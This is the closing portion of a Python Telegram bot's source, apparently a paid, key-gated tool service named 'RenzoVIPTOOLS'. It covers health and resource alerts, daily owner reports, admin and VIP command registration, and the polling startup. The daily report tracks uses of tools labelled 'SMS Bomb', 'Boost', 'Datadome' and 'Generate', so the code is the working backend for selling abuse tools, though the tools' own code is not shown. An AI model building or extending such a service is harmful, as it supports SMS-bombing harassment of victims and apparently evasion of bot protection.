        cpu_bar = "🟩" * int(cpu_pct / 10) + "⬜" * (10 - int(cpu_pct / 10))
        mem_bar = "🟩" * int(mem_pct / 10) + "⬜" * (10 - int(mem_pct / 10))

        health_text = (
            f"🤖 *Bot Health*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ Uptime:   `{get_uptime()}`\n"
            f"📦 Version: `v{BOT_VERSION}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💻 CPU:     `{cpu_pct:.1f}%`  {cpu_bar}\n"
            f"🧠 RAM:     `{mem_pct:.1f}%`  {mem_bar}\n"
            f"   System:  `{mem_used}MB / {mem_total}MB`\n"
            f"   Bot RSS: `{rss_mb}MB`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Users:   `{len(USER_ACCESS)}`\n"
            f"🔑 Keys:    `{len(ACCESS_KEYS)}`\n"
            f"🚫 Banned:  `{len(BANNED_USERS)}`\n"
            f"🔒 Blisted: `{len(BLACKLISTED_KEYS)}`"
        )
    except ImportError:
        health_text = (
            f"🤖 *Bot Health* (install `psutil` for full metrics)\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ Uptime:  `{get_uptime()}`\n"
            f"📦 Version: `v{BOT_VERSION}`\n"
            f"👥 Users:   `{len(USER_ACCESS)}`\n"
            f"🔑 Keys:    `{len(ACCESS_KEYS)}`"
        )

    await update.effective_message.reply_text(health_text, parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# BOT HEALTH: resource alert job — runs every 10 minutes
# ─────────────────────────────────────────────────────────────────────────────
async def check_resource_alerts(context: CallbackContext):
    """Job: alert owner if CPU or RAM spike above threshold."""
    global _LAST_RESOURCE_ALERT
    # Only alert once per hour to avoid spam
    if time.time() - _LAST_RESOURCE_ALERT < 3600:
        return
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory().percent
        alerts = []
        if cpu > CPU_ALERT_THRESHOLD:
            alerts.append(f"💻 CPU: `{cpu:.1f}%` (threshold: {CPU_ALERT_THRESHOLD}%)")
        if mem > MEMORY_ALERT_THRESHOLD:
            alerts.append(f"🧠 RAM: `{mem:.1f}%` (threshold: {MEMORY_ALERT_THRESHOLD}%)")
        if alerts:
            _LAST_RESOURCE_ALERT = time.time()
            msg = "⚠️ *Resource Alert*\n━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(alerts)
            await context.bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
    except ImportError:
        pass  # psutil not installed — skip silently
    except Exception as e:
        logging.debug(f"[resource_alert] {e}")


# ─────────────────────────────────────────────────────────────────────────────
# BOT HEALTH: startup DM to owner + auto-detect restarts
# (called from on_startup — already has the bot object)
# ─────────────────────────────────────────────────────────────────────────────
async def send_startup_dm(bot):
    """DM the owner when the bot starts/restarts."""
    try:
        now_ts = time.time()
        active = sum(1 for e in USER_ACCESS.values() if e is None or e > now_ts)
        await bot.send_message(
            ADMIN_ID,
            f"✅ *Bot Started / Restarted*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Version:  `v{BOT_VERSION}`\n"
            f"⏱️ Time:     `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"👥 Users:    `{len(USER_ACCESS)}` ({active} active)\n"
            f"🔑 Keys:     `{len(ACCESS_KEYS)}`\n"
            f"🗂️ DBs:      `{len(DATABASE_FILES)}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        logging.warning(f"[startup_dm] {e}")


# ─────────────────────────────────────────────────────────────────────────────
# DAILY REPORT JOB — auto-sent to owner DM every 24h
# ─────────────────────────────────────────────────────────────────────────────
async def daily_report_job(context: CallbackContext):
    """Job: send daily usage summary to owner."""
    now = time.time()
    one_day_ago = int(now) - 86400

    def count_24h(tool):
        return sum(
            cnt for ts, cnt in TOOL_HOURLY_USAGE.get(tool, {}).items()
            if int(ts) >= one_day_ago
        )

    active = sum(1 for e in USER_ACCESS.values() if e is None or e > now)
    expiring_soon = sum(
        1 for e in USER_ACCESS.values()
        if e and 0 < e - now < 86400
    )

    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"📊 *Daily Report — {datetime.date.today()}*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total users:    `{len(USER_ACCESS)}`\n"
            f"✅ Active:         `{active}`\n"
            f"⚠️ Expiring <24h:  `{expiring_soon}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"*Tool Uses (Last 24h)*\n"
            f"📂 Generate:  `{count_24h('generate')}`\n"
            f"💣 SMS Bomb:  `{count_24h('sms_bomb')}`\n"
            f"🚀 Boost:     `{count_24h('boost')}`\n"
            f"🔐 Encrypt:   `{count_24h('encrypt')}`\n"
            f"🛡️ Datadome:  `{count_24h('datadome')}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 Keys redeemed (all): `{GLOBAL_STATS.get('total_keys_redeemed', 0)}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        logging.warning(f"[daily_report] {e}")


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN QoL: /userinfo enhancement — support @username lookup
# (extends the existing userinfo_command to also accept @username)
# ─────────────────────────────────────────────────────────────────────────────
async def userlookup_by_username(username: str) -> int | None:
    """Try to find a user_id by @username in USER_STATS."""
    username = username.lstrip("@").lower()
    for uid, stats in USER_STATS.items():
        uname = stats.get("username", "").lstrip("@").lower()
        if uname == username:
            return uid
    return None



def main():
    """Start the bot."""
    _acquire_pid_lock()
    import atexit, signal
    atexit.register(_release_pid_lock)
    def _sig_handler(sig, frame):
        _release_pid_lock()
        raise SystemExit(0)
    signal.signal(signal.SIGTERM, _sig_handler)

    # Ensure data directories exist
    for path in [ACCESS_FILE, KEYS_FILE, REFERRAL_FILE]:
        dir_ = os.path.dirname(path)
        if dir_ and not os.path.exists(dir_):
            os.makedirs(dir_, exist_ok=True)

    load_existing_data()

    # Startup integrity log
    logging.info(f"[startup] Users: {len(USER_ACCESS)} | Keys: {len(ACCESS_KEYS)} | Roles: {len(USER_ROLES)}")
    if not TOKEN:
        logging.critical("[startup] TOKEN is empty — bot will not start!")
        raise SystemExit(1)
    
    application = (
        Application.builder()
        .token(TOKEN)
        .read_timeout(60)        # increased: Telegram long-poll can hold ~50s
        .write_timeout(60)
        .connect_timeout(30)
        .pool_timeout(60)
        .build()
    )
    
    # Conversation handler for encryption
    enc_conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(start_encryption, pattern="^start_encryption$"),
            # Also handle the reply-keyboard button press so the conversation
            # state is properly registered (otherwise the count input falls
            # through to handle_unknown_message → "UNKNOWN COMMAND")
            MessageHandler(
                filters.TEXT & filters.Regex(r"^🔐") & ~filters.COMMAND,
                start_encryption
            ),
        ],
        states={
            SELECTING_ENC_METHOD: [
                CallbackQueryHandler(handle_enc_method_callback, pattern="^enc_method_"),
                CallbackQueryHandler(enc_handle_pagination, pattern="^enc_page_"),
                CallbackQueryHandler(cancel_encryption, pattern="^cancel_encryption_conv$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, select_enc_method)
            ],
            SELECTING_ENC_COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, select_enc_count)
            ],
            UPLOADING_ENC_FILE: [
                MessageHandler(filters.Document.ALL, handle_enc_file_upload)
            ],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_encryption, pattern="^cancel_encryption_conv$"),
            CommandHandler("cancel", cancel_encryption)
        ],
        allow_reentry=True
    )
    
    application.add_handler(enc_conv_handler)
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("help", show_help))
    application.add_handler(CommandHandler("cancel", cancel_action))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("ping", ping_command))
    application.add_handler(CommandHandler("mykey", mykey_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("exchange", exchange_points))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("addtool", addtool_command))
    application.add_handler(CommandHandler("removetool", removetool_command))
    application.add_handler(CommandHandler("lookup", lookup_command))
    application.add_handler(CommandHandler("ban",    ban_command))
    application.add_handler(CommandHandler("unban",  unban_command))
    application.add_handler(CommandHandler("bans",   bans_command))
    application.add_handler(CommandHandler("feedbacks", show_feedbacks_command))
    application.add_handler(CommandHandler("usercount", usercount_command))
    # ── Admin commands (were missing from registration) ──
    application.add_handler(CommandHandler("approve",     approve_command))
    application.add_handler(CommandHandler("genkey",      genkey_command))
    application.add_handler(CommandHandler("delkey",      delkey_command))
    application.add_handler(CommandHandler("warn",        warn_command))
    application.add_handler(CommandHandler("warnings",    warnings_command))
    application.add_handler(CommandHandler("clearwarn",   clearwarn_command))
    application.add_handler(CommandHandler("setnote",     setnote_command))
    application.add_handler(CommandHandler("notes",       notes_command))
    application.add_handler(CommandHandler("activeusers", activeusers_command))
    application.add_handler(CommandHandler("expiring",    expiring_command))
    application.add_handler(CommandHandler("globalstats", globalstats_command))
    application.add_handler(CommandHandler("clearlocks",  clearlocks_command))
    application.add_handler(CommandHandler("resetstats",  resetstats_command))
    application.add_handler(CommandHandler("setquota",    setquota_command))
    application.add_handler(CommandHandler("backup",      admin_backup_command))
    application.add_handler(CommandHandler("helpadmin",   helpadmin_command))
    # ── User QoL commands ──
    application.add_handler(CommandHandler("profile",     profile_command))
    application.add_handler(CommandHandler("checkin",     checkin_command))
    application.add_handler(CommandHandler("refer",       refer_command))
    application.add_handler(CommandHandler("report",      report_command))
    application.add_handler(CommandHandler("miniadmin",   miniadmin_command))
    application.add_handler(CommandHandler("setperm",     setperm_command))
    application.add_handler(CommandHandler("rmperm",      rmperm_command))
    application.add_handler(CommandHandler("listadmins",  listadmins_command))
    application.add_handler(CommandHandler("userinfo",    userinfo_command))
    application.add_handler(CommandHandler("delnote",       delnote_command))
    # ── New v2.3.0 commands ──
    application.add_handler(CommandHandler("blacklistkey",   blacklistkey_command))
    application.add_handler(CommandHandler("extend",         extend_command))
    application.add_handler(CommandHandler("keylog",         keylog_command))
    application.add_handler(CommandHandler("exportkeys",     exportkeys_command))
    application.add_handler(CommandHandler("setkeycat",      setkeycat_command))
    application.add_handler(CommandHandler("usagereport",    usagereport_command))
    application.add_handler(CommandHandler("inactive",       inactive_command))
    application.add_handler(CommandHandler("schedannounce",  schedannounce_command))
    application.add_handler(CommandHandler("listschedule",   listschedule_command))
    application.add_handler(CommandHandler("cancelschedule", cancelschedule_command))
    application.add_handler(CommandHandler("undodelkey",     undodelkey_command))
    application.add_handler(CommandHandler("bothealth",      bothealth_command))

    # ── VIP-exclusive commands ──────────────────────────────────
    application.add_handler(CommandHandler("vipmenu",   vipmenu_command))
    application.add_handler(CommandHandler("vipstats",  vipstats_command))
    application.add_handler(CommandHandler("vipperks",  vipperks_command))
    application.add_handler(CommandHandler("viphelp",   viphelp_command))
    application.add_handler(CommandHandler("bulkgen",   bulkgen_command))
    application.add_handler(CommandHandler("checkup",   checkup_command))

    # VIP callback handler (must be before generic)
    application.add_handler(CallbackQueryHandler(
        _handle_vip_callbacks,
        pattern=r"^(vip_stats|vip_bulkgen|vip_checkup|vip_menu_cb|vip_multiboost|vip_export)$"
    ))
    # Callback query handler
    application.add_handler(CallbackQueryHandler(handle_callback_query))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unknown_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_unknown_message))
    # Register global error handler
    application.add_error_handler(error_handler)

    # Register bot command menu (shows in Telegram / menu)
    async def _cleanup_generated_dir(context):
        """Job: delete any leftover generated files older than 5 minutes."""
        cutoff = time.time() - 300
        cleaned = 0
        for f in GENERATED_DIR.glob("*"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
                    cleaned += 1
            except Exception:
                pass
        if cleaned:
            logging.info(f"[cleanup] Removed {cleaned} stale generated files")

    async def on_startup(app):
        await set_bot_commands(app)
        _jk = {"coalesce": True, "misfire_grace_time": None}
    
    # Check if job_queue exists before using it
        if app.job_queue is not None:
            app.job_queue.run_repeating(check_expiry_notifications, interval=3600, first=30, job_kwargs=_jk)
            app.job_queue.run_repeating(_cleanup_generated_dir, interval=300, first=60, job_kwargs=_jk)
            app.job_queue.run_repeating(auto_backup_to_owner, interval=86400, first=3600, job_kwargs=_jk)
            app.job_queue.run_repeating(daily_report_job, interval=86400, first=7200, job_kwargs=_jk)
            app.job_queue.run_repeating(check_resource_alerts, interval=600, first=120, job_kwargs=_jk)
        else:
            logging.warning("JobQueue is not available - scheduled tasks disabled")
    
        await send_startup_dm(app.bot)
    application.post_init = on_startup

    async def on_shutdown(app):
        save_access()
        logging.info("[shutdown] Final save complete.")
    application.post_shutdown = on_shutdown

    # Start the bot
    now_ts_start = time.time()
    active_at_start = sum(1 for e in USER_ACCESS.values() if e is None or e > now_ts_start)
    logging.info("=" * 52)
    logging.info(f"✅  RenzoVIPTOOLS v{BOT_VERSION} ({BOT_BUILD_DATE}) started")
    logging.info(f"👥  Users loaded:    {len(USER_ACCESS)} ({active_at_start} active)")
    logging.info(f"🔑  Keys available:  {len(ACCESS_KEYS)}")
    logging.info(f"🔗  Referrals:       {len(REFERRAL_DATA)}")
    logging.info(f"🚫  Banned:          {len(BANNED_USERS)}")
    logging.info(f"🗂️  Databases:       {len(DATABASE_FILES)} loaded")
    logging.info(f"📢  Channel:         {REQUIRED_CHANNEL}")
    logging.info(f"📡  Log channel:     {'set (' + str(LOG_CHANNEL_ID) + ')' if LOG_CHANNEL_ID else 'not set'}")
    logging.info(f"🛠️  Maintenance:     {'ON' if MAINTENANCE_MODE else 'OFF'}")
    logging.info(f"🔑  Token:           {'...set' if TOKEN else '⚠️  MISSING!'}")
    logging.info("=" * 52)
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        # Auto-reconnect after network errors instead of crashing
        close_loop=False,
    )

if __name__ == '__main__':
    main()

# ══════════════════════════════════════════════════════════════════════════════
